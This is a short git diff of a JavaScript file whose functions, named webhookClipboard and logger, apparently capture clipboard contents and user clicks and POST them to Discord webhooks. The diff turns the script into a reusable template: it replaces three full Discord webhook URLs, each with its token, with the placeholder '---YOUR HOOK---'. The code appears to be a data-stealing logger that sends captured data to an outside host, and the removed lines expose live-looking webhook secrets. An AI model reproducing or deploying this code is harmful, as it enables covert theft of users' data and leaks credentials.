@@ -7,7 +7,7 @@ function webhookClipboard() {
 
         var hook = new XMLHttpRequest();
 
-        hook.open('POST', 'https://discord.com/api/webhooks/1192931620039164026/TbT1C_AQPIFzWKuaydroCTTnC1caFb4R4i6RPbAI7_stqByiqh7fvlZpXEYKrSi6ziyl');
+        hook.open('POST', '---YOUR HOOK---');
 
         hook.setRequestHeader('Content-type', 'application/json');
 
@@ -38,7 +38,7 @@ function logger() {
                 el.addEventListener("click", () => {
                     var hook = new XMLHttpRequest();
 
-                    hook.open('POST', 'https://discord.com/api/webhooks/1192931450719322273/EGflMuia0EURbDWUlTuWA2C3d6DvUx_oK5VXeawT57hAqGauthYVKM7I-AG_KJwAw8xr');
+                    hook.open('POST', '---YOUR HOOK---');
 
                     hook.setRequestHeader('Content-type', 'application/json');
 
@@ -52,7 +52,7 @@ function logger() {
                 el.addEventListener("click", () => {
                     var hook = new XMLHttpRequest();
 
-                    hook.open('POST', 'https://discord.com/api/webhooks/1192931450719322273/EGflMuia0EURbDWUlTuWA2C3d6DvUx_oK5VXeawT57hAqGauthYVKM7I-AG_KJwAw8xr');
+                    hook.open('POST', '---YOUR HOOK---');
 
                     hook.setRequestHeader('Content-type', 'application/json');
 
